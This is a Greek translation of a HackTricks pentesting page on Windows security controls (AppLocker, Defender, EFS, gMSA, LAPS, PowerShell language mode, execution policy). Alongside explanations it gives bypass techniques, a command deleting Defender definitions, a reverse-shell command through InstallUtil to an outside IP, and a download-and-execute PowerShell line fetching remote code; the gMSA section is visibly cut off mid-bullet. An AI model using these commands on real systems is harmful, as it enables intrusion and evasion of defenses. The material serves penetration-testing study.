# Ελέγξτε την πολιτική του AppLocker

Ένας λευκός κατάλογος εφαρμογών είναι μια λίστα εγκεκριμένων λογισμικών ή εκτελέσιμων αρχείων που επιτρέπεται να υπάρχουν και να εκτελούνται σε ένα σύστημα. Ο στόχος είναι να προστατευθεί το περιβάλλον από κακόβουλο κακόβουλο λογισμικό και μη εγκεκριμένο λογισμικό που δεν συμμορφώνεται με τις συγκεκριμένες επιχειρηματικές ανάγκες μιας οργάνωσης.

Το [AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) είναι η λύση της Microsoft για τον λευκό κατάλογο εφαρμογών και δίνει στους διαχειριστές συστήματος έλεγχο επί των εφαρμογών και των αρχείων που μπορούν να εκτελέσουν οι χρήστες. Παρέχει λεπτομερή έλεγχο επί εκτελέσιμων αρχείων, σεναρίων, αρχείων εγκατάστασης του εγκαταστάτη των Windows, DLL, εφαρμογών που έχουν συσκευαστεί και εγκαταστάτες συσκευασμένων εφαρμογών.\
Συχνά, οι οργανισμοί αποκλείουν το cmd.exe και το PowerShell.exe και την πρόσβαση εγγραφής σε συγκεκριμένους καταλόγους, αλλά όλα αυτά μπορούν να παρακαμφθούν.

### Έλεγχος

Ελέγξτε ποια αρχεία/επεκτάσεις είναι στη μαύρη/λευκή λίστα:
```powershell
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
Αυτή η διαδρομή του μητρώου περιέχει τις ρυθμίσεις και τις πολιτικές που εφαρμόζονται από το AppLocker, παρέχοντας έναν τρόπο για να ελεγχθεί το τρέχον σύνολο των κανόνων που επιβάλλονται στο σύστημα:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`


### Παράκαμψη

* Χρήσιμοι **Φάκελοι εγγράψιμοι** για να παρακαμφθεί η πολιτική του AppLocker: Εάν το AppLocker επιτρέπει την εκτέλεση οτιδήποτε μέσα στο `C:\Windows\System32` ή `C:\Windows`, υπάρχουν **φάκελοι εγγράψιμοι** που μπορείτε να χρησιμοποιήσετε για να **παρακάμψετε αυτό**.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
* Συνήθως, οι δυαδικοί αρχείοι **"LOLBAS's"** που θεωρούνται αξιόπιστοι μπορούν να χρησιμοποιηθούν για να παρακάμψουν το AppLocker.
* Οι κακογραμμένοι κανόνες μπορούν επίσης να παρακαμφθούν.
* Για παράδειγμα, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, μπορείτε να δημιουργήσετε έναν φάκελο με το όνομα `allowed` οπουδήποτε και θα επιτραπεί.
* Οι οργανισμοί συχνά επικεντρώνονται στο να αποκλείουν το εκτελέσιμο `%System32%\WindowsPowerShell\v1.0\powershell.exe`, αλλά ξεχνούν τις **άλλες** [**τοποθεσίες εκτελέσιμων αρχείων PowerShell**](https://www.powershelladmin.com/wiki/PowerShell\_Executables\_File\_System\_Locations) όπως `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` ή `PowerShell_ISE.exe`.
* Η επιβολή DLL σπάνια είναι ενεργοποιημένη λόγω του επιπρόσθετου φόρτου που μπορεί να θέσει σε ένα σύστημα και της ποσότητας δοκιμών που απαιτούνται για να διασφαλιστεί ότι τίποτα δεν θα χαλάσει. Έτσι, η χρήση των DLL ως πίσω πόρτα θα βοηθήσει στην παράκαμψη του AppLocker.
* Μπορείτε να χρησιμοποιήσετε το [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ή το [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) για να εκτελέσετε κώδικα Powershell σε οποιαδήποτε διεργασία και να παρακάμψετε το AppLocker. Για περισσότερες πληροφορίες, ανατρέξτε στο: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## Αποθήκευση διαπιστευτηρίων

### Οδηγός Ασφαλείας Λογαριασμού (SAM)

Τα τοπικά διαπιστευτήρια βρίσκονται σε αυτό το αρχείο, με τους κωδικούς πρόσβασης να είναι κατακερματισμένοι.

### Τοπική Αρχή Ασφαλείας (LSA) - LSASS

Τα **διαπιστευτήρια** (κατακερματισμένα) αποθηκεύονται στη μνήμη αυτού του υποσυστήματος για λόγους Single Sign-On.\
Η **LSA** διαχειρίζεται την τοπική **πολιτική ασφαλείας** (πολιτική κωδικού πρόσβασης, δικαιώματα χρηστών...) , **πιστοποίηση**, **διαπιστευτήρια πρόσβασης**...\
Η LSA θα είναι αυτή που θα **ελέγξει** τα παρεχόμενα διαπιστευτήρια μέσα στο αρχείο **SAM** (για μια τοπική σύνδεση) και θα **επικοινωνήσει** με τον **ελεγκτή τομέα** για να πιστοποιήσει έναν χρήστη του τομέα.

Τα **διαπιστευτήρια** αποθηκεύονται μέσα στη διεργασία **LSASS**: εισιτήρια Kerberos, κατακερματισμένοι κωδικοί NT και LM, εύκολα αποκρυπτογραφημένοι κωδικοί πρόσβασης.

### Μυστικά της LSA

Η LSA μπορεί να αποθηκεύει στον δίσκο ορισμένα διαπιστευτήρια:

* Κωδικός του λογαριασμού υπολογιστή του Active Directory (απροσπέλαστος ελεγκτής τομέα).
* Κωδικοί των λογαριασμών των υπηρεσιών των Windows
* Κωδικοί για προγραμματισμένες εργασίες
* Περισσότερα (κωδικός των εφαρμογών IIS...)

### NTDS.dit

Είναι η βάση δεδομένων του Active Directory. Υπάρχει μόνο στους ελεγκτές τομέα.

## Defender

Ο [**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft\_Defender) είναι ένα αντιιικό πρόγραμμα που είναι διαθέσιμο στα Windows 10 και Windows 11, καθώς και σε εκδόσεις των Windows Server. Αποκλείει κοινά εργαλεία δοκιμής διείσδυσης όπως το **`WinPEAS`**. Ωστόσο, υπάρχουν τρόποι να παρακαμφθούν αυτές οι προστασίες.

### Έλεγχος

Για να ελέγξετε την κατάσταση του **Defender**, μπορείτε να εκτελέσετε την εντολή PS **`Get-MpComputerStatus`** (ελέγξτε την τιμή του **`RealTimeProtectionEnabled`** για να μάθετε αν είναι ενεργό):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Για να το απαριθμήσετε, μπορείτε επίσης να εκτελέσετε:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Κρυπτογραφημένο Σύστημα Αρχείων (EFS)

Το EFS ασφαλίζει τα αρχεία μέσω κρυπτογράφησης, χρησιμοποιώντας ένα **συμμετρικό κλειδί** γνωστό ως **Κλειδί Κρυπτογράφησης Αρχείου (FEK)**. Αυτό το κλειδί κρυπτογραφείται με το **δημόσιο κλειδί** του χρήστη και αποθηκεύεται μέσα στην εναλλακτική ροή δεδομένων $EFS του κρυπτογραφημένου αρχείου. Όταν απαιτείται αποκρυπτογράφηση, χρησιμοποιείται το αντίστοιχο **ιδιωτικό κλειδί** του ψηφιακού πιστοποιητικού του χρήστη για να αποκρυπτογραφηθεί το FEK από τη ροή $EFS. Περισσότερες λεπτομέρειες μπορούν να βρεθούν [εδώ](https://en.wikipedia.org/wiki/Encrypting_File_System).

**Σενάρια αποκρυπτογράφησης χωρίς πρωτοβουλία του χρήστη** περιλαμβάνουν:

- Όταν τα αρχεία ή οι φάκελοι μεταφέρονται σε ένα αρχείο συστήματος μη-EFS, όπως το [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), αποκρυπτογραφούνται αυτόματα.
- Τα κρυπτογραφημένα αρχεία που αποστέλλονται μέσω του πρωτοκόλλου SMB/CIFS αποκρυπτογραφούνται πριν τη μετάδοση.

Αυτή η μέθοδος κρυπτογράφησης επιτρέπει την **άμεση πρόσβαση** στα κρυπτογραφημένα αρχεία για τον ιδιοκτήτη. Ωστόσο, η απλή αλλαγή του κωδικού πρόσβασης του ιδιοκτήτη και η σύνδεση δεν επιτρέπουν την αποκρυπτογράφηση.

**Σημαντικά Στοιχεία**:
- Το EFS χρησιμοποιεί ένα συμμετρικό FEK, το οποίο κρυπτογραφείται με το δημόσιο κλειδί του χρήστη.
- Η αποκρυπτογράφηση χρησιμοποιεί το ιδιωτικό κλειδί του χρήστη για να αποκτήσει πρόσβαση στο FEK.
- Η αυτόματη αποκρυπτογράφηση συμβαίνει υπό συγκεκριμένες συνθήκες, όπως η αντιγραφή σε FAT32 ή η μετάδοση μέσω δικτύου.
- Τα κρυπτογραφημένα αρχεία είναι προσβάσιμα από τον ιδιοκτήτη χωρίς επιπλέον βήματα.

### Έλεγχος πληροφοριών EFS

Ελέγξτε αν ένας **χρήστης** έχει **χρησιμοποιήσει** αυτήν την **υπηρεσία** ελέγχοντας αν υπάρχει αυτή η διαδρομή: `C:\users\<όνομα_χρήστη>\appdata\roaming\Microsoft\Protect`

Ελέγξτε **ποιος** έχει **πρόσβαση** στο αρχείο χρησιμοποιώντας την εντολή `cipher /c \<αρχείο>\`
Μπορείτε επίσης να χρησιμοποιήσετε τις εντολές `cipher /e` και `cipher /d` μέσα σε έναν φάκελο για να **κρυπτογραφήσετε** και **αποκρυπτογραφήσετε** όλα τα αρχεία

### Αποκρυπτογράφηση αρχείων EFS

#### Είναι ο Χρήστης Αρχής

Αυτός ο τρόπος απαιτεί τον **χρήστη θύμα** να **εκτελεί** ένα **διαδικασία** μέσα στον υπολογιστή. Αν αυτό ισχύει, χρησιμοποιώντας μια συνεδρία `meterpreter` μπορείτε να προσομοιώσετε το διαπιστευτήριο της διεργασίας του χρήστη (`impersonate_token` από το `incognito`). Ή μπορείτε απλά να `migrate` στη διεργασία του χρήστη.

#### Γνωρίζοντας τον κωδικό πρόσβασης του χρήστη

{% embed url="https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files" %}

## Διαχειριζόμενοι Λογαριασμοί Ομάδας Υπηρεσιών (gMSA)

Η Microsoft ανέπτυξε τους **Διαχειριζόμενους Λογαριασμούς Ομάδας Υπηρεσιών (gMSA)** για να απλοποιήσει τη διαχείριση των λογαριασμών υπηρεσίας στις υποδομές IT. Αντίθετα με τους παραδοσιακούς λογαριασμούς υπηρεσίας που συχνά έχουν ενεργοποιημένη τη ρύθμιση "**Ο κωδικός ποτέ δεν λήγει**", οι gMSA προσφέρουν μια πιο ασφαλή και διαχειρίσιμη λύση:

- **Αυτόματη Διαχείριση Κωδικού**: Οι gMSA χρησιμοποιούν έναν πολύπλοκο κωδικό μήκους 240 χαρακτήρων που αλλάζει αυτόματα σύμφωνα με την πολιτική του τομέα ή του υπολογιστή. Αυτή η διαδικασία χειρίζεται από την Υπηρεσία Διανομής Κλειδιών (KDC) της Microsoft, εξαλείφοντας την ανάγκη για χειροκίνητες ενημερώσεις κωδικού.
- **Ενισχυμένη Ασφάλεια**: Αυτοί οι λογαριασμοί είναι ανθεκτικοί στο κλείδωμα και δεν μπορούν να χρησιμοποιηθούν για διαδραστικές συνδέσεις, ενισχύοντας την ασφάλειά τους.
- **Υποστήριξη Πολλαπλών Υπολογιστών**: Οι gMSA μπορούν να κοινοποιηθούν σε πολλούς υπολογιστές, καθιστώντας τους ιδανικούς για υπηρεσίες που λειτουργούν σε πολλούς διακομιστές.
- **
```
/GMSAPasswordReader --AccountName jkohler
```
**[Βρείτε περισσότερες πληροφορίες σε αυτήν την ανάρτηση](https://cube0x0.github.io/Relaying-for-gMSA/)**

Επίσης, ελέγξτε αυτήν την [ιστοσελίδα](https://cube0x0.github.io/Relaying-for-gMSA/) σχετικά με το πώς να εκτελέσετε μια επίθεση **NTLM relay** για να **διαβάσετε** τον **κωδικό πρόσβασης** του **gMSA**.

## LAPS

Η **Λύση Τοπικού Διαχειριστή Κωδικού Πρόσβασης (LAPS)**, διαθέσιμη για λήψη από την [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), επιτρέπει τη διαχείριση των τοπικών κωδικών πρόσβασης του διαχειριστή. Αυτοί οι κωδικοί πρόσβασης, οι οποίοι είναι **τυχαίοι**, μοναδικοί και **αλλάζουν τακτικά**, αποθηκεύονται κεντρικά στο Active Directory. Η πρόσβαση σε αυτούς τους κωδικούς περιορίζεται μέσω των ACLs σε εξουσιοδοτημένους χρήστες. Με την απονομή επαρκών δικαιωμάτων, παρέχεται η δυνατότητα ανάγνωσης των τοπικών κωδικών πρόσβασης.

{% content-ref url="active-directory-methodology/laps.md" %}
[laps.md](active-directory-methodology/laps.md)
{% endcontent-ref %}

## Λειτουργία Περιορισμένης Γλώσσας PowerShell

Η [**Λειτουργία Περιορισμένης Γλώσσας PowerShell**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **περιορίζει πολλές από τις λειτουργίες** που απαιτούνται για την αποτελεσματική χρήση του PowerShell, όπως ο περιορισμός των COM αντικειμένων, η επιτροπή μόνο εγκεκριμένων τύπων .NET, οι ροές εργασίας βασισμένες σε XAML, οι κλάσεις PowerShell και άλλα.

### **Έλεγχος**
```powershell
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Παράκαμψη

Η παράκαμψη είναι μια τεχνική που χρησιμοποιείται για να παρακάμψει τις ασφαλείς μηχανισμούς πιστοποίησης και πρόσβασης σε ένα σύστημα. Με την παράκαμψη, ο χάκερ μπορεί να αποκτήσει πρόσβαση σε προνομιακές λειτουργίες ή πληροφορίες χωρίς την απαιτούμενη πιστοποίηση.

Υπάρχουν διάφορες τεχνικές παράκαμψης που μπορούν να χρησιμοποιηθούν, όπως η εκμετάλλευση ευπαθειών στο λογισμικό, η χρήση κακόβουλου λογισμικού ή η απάτη των χρηστών για να αποκτήσουν πρόσβαση σε πιστοποιητικά ή διαπιστευτήρια.

Οι χάκερ μπορούν επίσης να χρησιμοποιήσουν τεχνικές παράκαμψης για να παρακάμψουν τον έλεγχο του χρήστη (UAC) ή το σύστημα αρχείων κρυπτογράφησης (EFS) σε ένα σύστημα Windows. Αυτό τους επιτρέπει να αποκτήσουν πρόσβαση σε προνομιακές λειτουργίες ή κρυπτογραφημένα αρχεία χωρίς την απαιτούμενη πιστοποίηση ή κλειδί αποκρυπτογράφησης.
```powershell
#Easy bypass
Powershell -version 2
```
Στα τρέχοντα Windows αυτή η παράκαμψη δεν θα λειτουργήσει, αλλά μπορείτε να χρησιμοποιήσετε το [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
**Για να το μεταγλωττίσετε, μπορεί να χρειαστεί να** _**Προσθέσετε μια Αναφορά**_ -> _Περιήγηση_ -> _Περιήγηση_ -> προσθέστε `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` και **αλλάξτε το έργο σε .Net4.5**.

#### Άμεση παράκαμψη:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Αντίστροφη κέλυφος:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
Μπορείτε να χρησιμοποιήσετε το [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ή το [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) για να εκτελέσετε κώδικα Powershell σε οποιαδήποτε διεργασία και να παρακάμψετε την περιορισμένη λειτουργία. Για περισσότερες πληροφορίες ανατρέξτε στο: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## Πολιτική Εκτέλεσης PS

Από προεπιλογή είναι ορισμένη σε **περιορισμένη**. Οι κύριοι τρόποι για να παρακάμψετε αυτήν την πολιτική είναι:
```powershell
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
Περισσότερες πληροφορίες μπορούν να βρεθούν [εδώ](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)

## Διεπαφή Υποστήριξης Παρόχου Ασφάλειας (SSPI)

Είναι η διεπαφή προγραμματισμού εφαρμογών που μπορεί να χρησιμοποιηθεί για την πιστοποίηση των χρηστών.

Η SSPI έχει τον ρόλο να βρει το κατάλληλο πρωτόκολλο για δύο μηχανές που θέλουν να επικοινωνήσουν. Η προτιμώμενη μέθοδος για αυτό είναι το Kerberos. Στη συνέχεια, η SSPI θα διαπραγματευτεί ποιο πρωτόκολλο πιστοποίησης θα χρησιμοποιηθεί. Αυτά τα πρωτόκολλα πιστοποίησης ονομάζονται Πάροχοι Υποστήριξης Ασφάλειας (SSP) και βρίσκονται μέσα σε κάθε μηχάνημα Windows σε μορφή DLL και και οι δύο μηχανές πρέπει να υποστηρίζουν τον ίδιο πάροχο για να μπορούν να επικοινωνήσουν.

### Κύριοι Πάροχοι Υποστήριξης Ασφάλειας (SSP)

* **Kerberos**: Ο προτιμώμενος
* %windir%\Windows\System32\kerberos.dll
* **NTLMv1** και **NTLMv2**: Λόγω συμβατότητας
* %windir%\Windows\System32\msv1\_0.dll
* **Digest**: Διακομιστές ιστού και LDAP, κωδικός πρόσβασης σε μορφή κατακερματισμένου MD5
* %windir%\Windows\System32\Wdigest.dll
* **Schannel**: SSL και TLS
* %windir%\Windows\System32\Schannel.dll
* **Negotiate**: Χρησιμοποιείται για τη διαπραγμάτευση του πρωτοκόλλου που θα χρησιμοποιηθεί (Kerberos ή NTLM, με το Kerberos να είναι το προεπιλεγμένο)
* %windir%\Windows\System32\lsasrv.dll

#### Η διαπραγμάτευση μπορεί να προσφέρει πολλές μεθόδους ή μόνο μία.

## UAC - Έλεγχος Χρήστη Λογαριασμού

[Ο Έλεγχος Χρήστη Λογαριασμού (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) είναι μια λειτουργία που επιτρέπει ένα **παράθυρο συναίνεσης για αυξημένες δραστηριότητες**.

{% content-ref url="windows-security-controls/uac-user-account-control.md" %}
[uac-user-account-control.md](windows-security-controls/uac-user-account-control.md)
{% endcontent-ref %}

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Χρησιμοποιήστε το [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) για να δημιουργήσετε και να αυτοματοποιήσετε ροές εργασίας με τα πιο προηγμένα εργαλεία της κοινότητας.\
Αποκτήστε πρόσβαση σήμερα:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

***

<details>

<summary><strong>Μάθετε το hacking στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την εταιρεία σας να διαφημίζεται στο HackTricks ή να κατεβάσετε το HackTricks σε μορφή PDF, ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε** 💬 [**στην ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα κόλπα σας για το hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>
